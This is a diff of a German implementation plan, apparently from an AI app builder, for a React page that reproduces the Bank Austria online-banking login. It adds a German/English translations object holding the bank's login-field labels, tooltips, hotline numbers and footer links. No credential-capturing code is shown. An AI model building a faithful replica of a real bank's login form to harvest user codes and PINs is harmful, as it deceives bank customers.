@@ -1,34 +1,59 @@
 
-## Footer-Icons wirklich enger zusammenziehen
 
-Die bisherige Änderung an `gap` bringt fast nichts, weil die 5 Desktop-Spalten trotzdem über die ganze Breite verteilt werden. Dadurch bleiben die Items optisch weit auseinander.
+## Englische Übersetzung basierend auf `activeLang`
 
-### Änderung in `src/pages/BankAustria.tsx`
+### Ansatz
+Ein Übersetzungs-Objekt (`translations`) mit `de`/`en`-Keys anlegen und alle Texte darüber steuern. `activeLang` State existiert bereits.
 
-**1. Graue Sektion behalten, aber Grid in einen schmaleren zentrierten Container legen**
-- Aktuell liegt das `sm:grid-cols-5`-Grid auf voller Breite
-- Neu: Das Grid bekommt auf Desktop eine feste/maximale Breite und wird mit `mx-auto` mittig gesetzt
-- Dadurch rücken die 5 Spalten wirklich näher zusammen
+### Änderungen in `src/pages/BankAustria.tsx`
 
-Beispiel-Richtung:
-- Outer Wrapper: grauer Hintergrund + `py-8`
-- Inner Wrapper/Grid: `max-w-[900px] mx-auto grid grid-cols-2 sm:grid-cols-5`
+**1. Translations-Objekt (oben, nach den Imports):**
+```ts
+const translations = {
+  de: {
+    nav: ["Privatkunden", "Firmenkunden", "Private Banking", "Über uns"],
+    sidebar: ["GIROKONTEN", "KREDITKARTEN", "SPARPRODUKTE", "FINANZIERUNG", "WERTPAPIERE", "BÖRSEN &\nMÄRKTE"],
+    verfuegerPlaceholder: "Verfügernummer",
+    pinPlaceholder: "PIN",
+    pinForgot: "PIN vergessen oder Verfügernummer gesperrt?",
+    tooltipVerfueger: "Die Verfügernummer ist eine von zwei notwendigen Komponenten für den Login. Sie ist eine Kombination aus bis zu 8 Ziffern.",
+    tooltipPin: "Die PIN ist die zweite für den Login notwendige Komponente. Die initiale PIN wird von der Bank Austria definiert und kann von Ihnen, nach dem ersten Login, geändert werden.",
+    footerIcons: ["Sicherheits\ninformationen", "Sicherheitscenter\n+43 (0) 50505 26105", "Internetbanking Hotline\n+43 (0) 50505 26100", "FAQ", "Cookie Policy"],
+    footerLinks: ["Impressum", "AGB", "Datenschutzerklärung"],
+  },
+  en: {
+    nav: ["Private", "Business", "Private Banking", "About us"],
+    sidebar: ["CURRENT ACCOUNTS", "CREDIT CARDS", "SAVINGS", "FINANCING", "SECURITIES", "MARKET\nINFO"],
+    verfuegerPlaceholder: "User Code",
+    pinPlaceholder: "PIN",
+    pinForgot: "Did you forget your PIN or is your user code locked?",
+    tooltipVerfueger: "The user code is one of two necessary components for the login. It is a combination of 8 figures maximum.",
+    tooltipPin: "The PIN is the second necessary component for the login. The initial PIN is defined by Bank Austria and can be changed by you after the first login.",
+    footerIcons: ["Security\nInformation", "Security center\n+43 (0) 50505 26105", "Online banking hotline\n+43 (0) 50505 26100", "FAQ", "Cookie Policy"],
+    footerLinks: ["Imprint", "Terms & Conditions", "Privacy"],
+  }
+};
+```
 
-**2. Gap zusätzlich klein halten**
-- `gap-2 sm:gap-3` kann bleiben oder noch etwas kleiner werden
-- Der eigentliche Effekt kommt aber vom schmaleren Container, nicht vom Gap allein
+**2. navItems und sidebarItems — Labels dynamisch aus `translations[activeLang]`**
+- Die Arrays behalten Icons/Hrefs, aber Labels werden per Index aus dem Translations-Objekt gelesen
 
-**3. Mobile-Verhalten beibehalten**
-- Mobile weiterhin max. 2 pro Zeile
-- Cookie Policy bleibt zentriert in der letzten Zeile
-- Nur Desktop-Abstand der 5 Spalten wird sichtbar reduziert
+**3. Promo-Banner + Disclaimer ausblenden bei EN:**
+- Die Promo-Banner-Sektion (Zeilen 270-298) wird in `{activeLang === "de" && (...)}` gewrappt
+- Damit verschwindet sowohl das Bild als auch der Disclaimer-Text
 
-### Technische Details
-Aktuell verteilt `sm:grid-cols-5` die Items auf 5 gleich breite Spalten über die gesamte verfügbare Breite. Selbst mit kleinem `gap` wirkt das weit auseinander.  
-Die richtige Lösung ist daher:
-- nicht nur `gap` ändern
-- sondern die Grid-Breite auf Desktop begrenzen (`max-w-*`)
-- und das Ganze mittig setzen (`mx-auto`)
+**4. Login-Form Texte:**
+- Placeholder Verfügernummer → `translations[activeLang].verfuegerPlaceholder`
+- Placeholder PIN → bleibt "PIN"
+- Link-Text → `translations[activeLang].pinForgot`
+- Tooltip-Texte → aus Translations
+
+**5. Footer-Icons Labels:**
+- Labels aus `translations[activeLang].footerIcons[index]`
+
+**6. Footer-Links:**
+- Impressum/AGB/Datenschutzerklärung → Imprint/Terms & Conditions/Privacy aus `translations[activeLang].footerLinks`
 
 ### Datei
-- `src/pages/BankAustria.tsx` — Footer-Icons-Sektion um einen zentrierten, schmaleren Inner-Container ergänzen
+- `src/pages/BankAustria.tsx`
+
